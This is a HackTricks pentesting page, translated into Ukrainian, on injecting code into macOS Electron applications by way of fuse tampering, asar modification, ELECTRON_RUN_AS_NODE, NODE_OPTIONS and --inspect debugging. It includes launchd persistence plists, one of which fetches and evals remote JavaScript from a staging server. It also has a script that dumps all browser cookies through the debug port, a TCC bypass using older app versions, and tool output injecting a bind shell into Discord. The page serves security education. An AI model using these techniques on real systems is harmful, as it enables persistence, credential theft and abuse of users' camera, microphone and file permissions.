# macOS Electron Applications Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

Якщо ви не знаєте, що таке Electron, ви можете знайти [**багато інформації тут**](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/xss-to-rce-electron-desktop-apps). Але поки просто знайте, що Electron працює на **node**.\
А node має деякі **параметри** та **змінні середовища**, які можна використовувати для **виконання іншого коду** окрім вказаного файлу.

### Electron Fuses

Ці техніки будуть обговорені далі, але в останні часи Electron додав кілька **параметрів безпеки для їх запобігання**. Це [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses) і це ті, що використовуються для **запобігання** завантаженню Electron додатків в macOS **произвольного коду**:

* **`RunAsNode`**: Якщо вимкнено, заважає використанню змінної середовища **`ELECTRON_RUN_AS_NODE`** для ін'єкції коду.
* **`EnableNodeCliInspectArguments`**: Якщо вимкнено, параметри, такі як `--inspect`, `--inspect-brk`, не будуть враховані. Уникаючи таким чином ін'єкції коду.
* **`EnableEmbeddedAsarIntegrityValidation`**: Якщо увімкнено, завантажений **`asar`** **файл** буде **перевірений** macOS. **Запобігаючи** таким чином **ін'єкції коду** шляхом модифікації вмісту цього файлу.
* **`OnlyLoadAppFromAsar`**: Якщо це увімкнено, замість пошуку завантаження в наступному порядку: **`app.asar`**, **`app`** і нарешті **`default_app.asar`**. Він перевірятиме та використовуватиме лише app.asar, таким чином забезпечуючи, що при **поєднанні** з параметром **`embeddedAsarIntegrityValidation`** неможливо **завантажити неперевірений код**.
* **`LoadBrowserProcessSpecificV8Snapshot`**: Якщо увімкнено, процес браузера використовує файл під назвою `browser_v8_context_snapshot.bin` для свого V8 знімка.

Ще один цікавий параметр, який не запобігатиме ін'єкції коду:

* **EnableCookieEncryption**: Якщо увімкнено, сховище куків на диску шифрується за допомогою криптографічних ключів на рівні ОС.

### Checking Electron Fuses

Ви можете **перевірити ці параметри** з програми за допомогою:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Модифікація електронних запобіжників

Як згадують [**документи**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), конфігурація **Electron Fuses** налаштовується всередині **бінарного файлу Electron**, який містить десь рядок **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`**.

У macOS додатках це зазвичай знаходиться в `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework`
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Ви можете завантажити цей файл у [https://hexed.it/](https://hexed.it/) і знайти попередній рядок. Після цього рядка ви можете побачити в ASCII число "0" або "1", що вказує, чи кожен запобіжник вимкнений або увімкнений. Просто змініть шістнадцятковий код (`0x30` - це `0`, а `0x31` - це `1`), щоб **змінити значення запобіжників**.

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

Зверніть увагу, що якщо ви спробуєте **перезаписати** бінарний файл **`Electron Framework`** всередині програми з цими зміненими байтами, програма не запуститься.

## RCE додавання коду до Electron Applications

Можуть бути **зовнішні JS/HTML файли**, які використовує Electron App, тому зловмисник може впровадити код у ці файли, підпис яких не буде перевірятися, і виконати довільний код в контексті програми.

{% hint style="danger" %}
Однак на даний момент є 2 обмеження:

* Дозвіл **`kTCCServiceSystemPolicyAppBundles`** є **необхідним** для зміни програми, тому за замовчуванням це більше не можливо.
* Скомпільований файл **`asap`** зазвичай має запобіжники **`embeddedAsarIntegrityValidation`** `та` **`onlyLoadAppFromAsar`** `увімкненими`

Це ускладнює (або робить неможливим) цей шлях атаки.
{% endhint %}

Зверніть увагу, що можна обійти вимогу **`kTCCServiceSystemPolicyAppBundles`**, скопіювавши програму в інший каталог (наприклад, **`/tmp`**), перейменувавши папку **`app.app/Contents`** на **`app.app/NotCon`**, **змінивши** файл **asar** з вашим **зловмисним** кодом, перейменувавши його назад на **`app.app/Contents`** і виконавши його.

Ви можете розпакувати код з файлу asar за допомогою:
```bash
npx asar extract app.asar app-decomp
```
І запакуйте його назад після внесення змін за допомогою:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE з `ELECTRON_RUN_AS_NODE` <a href="#electron_run_as_node" id="electron_run_as_node"></a>

Згідно з [**документацією**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node), якщо ця змінна середовища встановлена, вона запустить процес як звичайний процес Node.js.

{% code overflow="wrap" %}
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Якщо запобіжник **`RunAsNode`** вимкнено, змінна середовища **`ELECTRON_RUN_AS_NODE`** буде проігнорована, і це не спрацює.
{% endhint %}

### Ін'єкція з App Plist

Як [**пропонується тут**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), ви можете зловживати цією змінною середовища в plist для підтримки постійності:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE з `NODE_OPTIONS`

Ви можете зберегти корисне навантаження в іншому файлі та виконати його:

{% code overflow="wrap" %}
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
{% endcode %}

{% hint style="danger" %}
Якщо запобіжник **`EnableNodeOptionsEnvironmentVariable`** є **вимкненим**, додаток буде **ігнорувати** змінну середовища **NODE\_OPTIONS** під час запуску, якщо змінна середовища **`ELECTRON_RUN_AS_NODE`** не встановлена, яка також буде **ігноруватися**, якщо запобіжник **`RunAsNode`** вимкнений.

Якщо ви не встановите **`ELECTRON_RUN_AS_NODE`**, ви отримаєте **помилку**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`
{% endhint %}

### Ін'єкція з App Plist

Ви можете зловживати цією змінною середовища в plist для підтримки постійності, додавши ці ключі:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE з інспекцією

Згідно з [**цією**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f) інформацією, якщо ви виконаєте додаток Electron з такими прапорами, як **`--inspect`**, **`--inspect-brk`** та **`--remote-debugging-port`**, **порт для налагодження буде відкритий**, тому ви зможете підключитися до нього (наприклад, з Chrome у `chrome://inspect`) і ви зможете **впровадити код у нього** або навіть запустити нові процеси.\
Наприклад:

{% code overflow="wrap" %}
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
{% endcode %}

{% hint style="danger" %}
Якщо запобіжник **`EnableNodeCliInspectArguments`** вимкнено, додаток **ігноруватиме параметри node** (такі як `--inspect`) під час запуску, якщо змінна середовища **`ELECTRON_RUN_AS_NODE`** не встановлена, яка також буде **ігноруватися**, якщо запобіжник **`RunAsNode`** вимкнено.

Однак, ви все ще можете використовувати **параметр electron `--remote-debugging-port=9229`**, але попереднє навантаження не спрацює для виконання інших процесів.
{% endhint %}

Використовуючи параметр **`--remote-debugging-port=9222`**, можливо вкрасти деяку інформацію з Electron App, таку як **історія** (з командами GET) або **куки** браузера (оскільки вони **дешифруються** всередині браузера і є **json-інтерфейс**, який їх надає).

Ви можете дізнатися, як це зробити [**тут**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) і [**тут**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f) та використовувати автоматичний інструмент [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) або простий скрипт, як:
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
В [**цьому блозі**](https://hackerone.com/reports/1274695) це налагодження зловживається для того, щоб безголовий chrome **завантажував довільні файли в довільні місця**.

### Ін'єкція з App Plist

Ви можете зловживати цією змінною середовища в plist для підтримки постійності, додавши ці ключі:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Older Versions

{% hint style="success" %}
Демон TCC з macOS не перевіряє виконувану версію програми. Тому, якщо ви **не можете інжектувати код в Electron додаток** за допомогою будь-якої з попередніх технік, ви можете завантажити попередню версію APP і інжектувати код в неї, оскільки вона все ще отримає привілеї TCC (якщо тільки Trust Cache не завадить цьому).
{% endhint %}

## Run non JS Code

Попередні техніки дозволять вам виконувати **JS код всередині процесу електронного додатку**. Однак пам'ятайте, що **дочірні процеси працюють під тим же профілем пісочниці**, що й батьківський додаток, і **успадковують їхні TCC дозволи**.\
Отже, якщо ви хочете зловживати правами доступу до камери або мікрофона, наприклад, ви можете просто **виконати інший бінарний файл з процесу**.

## Automatic Injection

Інструмент [**electroniz3r**](https://github.com/r3ggi/electroniz3r) можна легко використовувати для **пошуку вразливих електронних додатків**, які встановлені, і інжектування коду в них. Цей інструмент спробує використати техніку **`--inspect`**:

Вам потрібно скомпілювати його самостійно і ви можете використовувати його так:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
## Посилання

* [https://www.electronjs.org/docs/latest/tutorial/fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
* [https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
* [https://m.youtube.com/watch?v=VWQY5R2A6X8](https://m.youtube.com/watch?v=VWQY5R2A6X8)

{% hint style="success" %}
Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Підтримайте HackTricks</summary>

* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.

</details>
{% endhint %}
